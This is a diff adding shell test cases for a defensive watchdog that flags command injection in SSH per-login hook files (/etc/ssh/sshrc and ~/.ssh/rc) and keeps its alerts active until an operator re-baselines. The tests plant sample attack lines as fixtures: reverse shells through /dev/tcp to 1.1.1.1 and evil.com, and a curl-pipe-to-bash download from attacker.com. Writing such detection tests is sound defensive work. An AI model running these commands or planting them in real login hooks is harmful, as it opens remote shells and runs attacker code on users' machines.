@@ -175,3 +175,52 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-sshrc -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): sshrc-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
+    # T1546 per-SSH-login exec surface — injection alert must
+    # persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '# sshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SSHRC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"sshrc_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# sshrc\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nif read proto cookie; then :; fi\n' > "${SSHRC}"
+    run_wd
+    ! cap | grep -q '"event":"sshrc_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-file scan: ~/.ssh/rc also scanned via FILES_V — full per-login surface)" {
+    # /etc/ssh/sshrc is the system-wide per-SSH-login hook;
+    # ~/.ssh/rc is the per-user variant. Attackers may target
+    # either. Lock multi-file axis.
+    USERRC="${TMP}/user-sshrc"
+    seed_benign
+    FILES_V="${SSHRC} ${USERRC}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in the per-user variant.
+    printf '# user .ssh/rc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${USERRC}"
+    FILES_V="${SSHRC} ${USERRC}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    # curl | bash is a common bootstrap variant. Lock detection
+    # of the bash suffix in addition to sh.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# sshrc\ncurl -s http://attacker.com/p | bash\n' > "${SSHRC}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
